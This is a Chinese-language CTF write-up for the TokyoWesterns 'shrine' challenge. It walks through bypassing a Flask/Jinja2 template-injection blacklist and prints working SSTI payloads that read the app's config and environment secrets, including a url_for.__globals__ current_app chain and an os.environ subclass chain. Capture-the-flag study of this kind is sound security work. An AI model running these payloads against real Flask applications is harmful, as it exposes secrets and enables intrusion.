## shrine

题目来源：TokyoWesterns CTF 

https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5423&page=2

访问网站，拿到源码

```python
import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
@app.route('/')
def index():
    return open(__file__).read()
@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__':
    app.run(debug=True)
```

显然是/shrine/下模板注入，但是要绕过safe_jinjia

如果我们可以用```config```的话

直接

```
/shrine/{{config}} 
->
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': True, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'FLAG': 'TWCTF{secret}', 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>
```

可以拿到flag

如果我们可以用```self```

```
/shrine/{{self}}
->
<TemplateReference None>

/shrine/{{self.__dict__}}
->
{'_TemplateReference__context': <Context {'url_for': <function url_for at 0x7f67e7d0cb90>, 'g': <flask.g of 'main'>, 'request': <Request 'http://my_server/shrine/{{self.__dict__}}' [GET]>, 'namespace': <class 'jinja2.utils.Namespace'>, 'lipsum': <function generate_lorem_ipsum at 0x7f67e8dc2c08>, 'aaaa': None, 'range': <type 'xrange'>, 'session': <NullSession {}>, 'dict': <type 'dict'>, 'get_flashed_messages': <function get_flashed_messages at 0x7f67e7d0ccf8>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'config': <Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': True, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'FLAG': 'TWCTF{secret}', 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>} of None>}
```

也可拿到flag

如果我们可以用```()```

根据Flask SSTI的套路

一步步fuzz

最后可以得到payload

```
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}}
->
'FLAG': 'TWCTF{secret}'
```

然而这些都没有，这怎么办

这里就要利用强大的```current_app```了，拥有当前应用的所有环境

怎么拿到curren_app呢

根据大佬的wp,

一种方法是利用url_for(这里没有过滤)，在```{{url_for.__globals__}}```可以找到current_app

```
'current_app': <Flask 'app'>
```

然后就有payload

```
{{url_for.__globals__['current_app'].config['FLAG']}}
```

或者利用get_flashed_messages也可找到current_app

```
{{get_flashed_messages.__globals__}}
->
```

事实上，遇到flask SSTI,我们不妨可以试试这几个类

```
url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config,self
```



### 参考资料

Flask之SSTI模板注入：

[https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/](https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/)

python沙箱逃逸总结：

http://shaobaobaoer.cn/archives/656/python-sandbox-escape

本题详细的wp:

https://ctftime.org/writeup/10895